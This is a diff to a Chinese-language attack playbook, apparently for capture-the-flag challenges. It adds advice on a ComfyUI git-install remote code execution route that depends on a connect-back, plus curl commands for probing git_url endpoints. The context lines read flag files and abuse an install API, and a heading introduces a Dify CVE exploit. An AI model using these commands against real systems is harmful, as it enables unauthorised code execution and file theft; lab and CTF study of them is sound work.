@@ -114,6 +114,20 @@ curl -s "$TARGET/api/manager/install" -X POST -H 'Content-Type: application/json
 curl -s "$TARGET/file=/flag" ; curl -s "$TARGET/file=/challenge/flag"
 ```
 
+**⚠️ git install RCE 依赖回连，网络隔离时是死路**：
+- `install/git_url` 或 `/customnode/install/git_url` 需要目标主动访问你起的 HTTP 服务器拉取 git 仓库。
+- 若多次超时且你这边服务没收到入站请求，说明目标无法回连（网络隔离）——**立即放弃这条路径**，不要反复重试。
+- 改为：扫描同主机其他端口（ComfyUI 常和别的服务同机部署），或找不依赖回连的 RCE/文件读取。
+
+**同主机其他端口的 git_url 类接口**：若在别的端口发现 aiohttp 服务，且某接口返回
+`ERR TypeError("object of type 'NoneType' has no len()")`，说明该接口**缺少某个参数**（调用
+`len()` 前参数是 None）。立即补上常见参数名重试：
+```bash
+curl -s "http://TARGET:PORT/git_url?url=http://127.0.0.1/"
+curl -s "http://TARGET:PORT/git_url?repo=..."
+curl -s -X POST "http://TARGET:PORT/git_url" -H 'Content-Type: application/json' -d '{"url":"..."}'
+```
+
 ### 6.6 Dify / React2Shell (CVE-2025-55182) 多版本利用
 
 **场景**：Dify 平台（Next.js App Router + React Server Components），端口通常 3000。
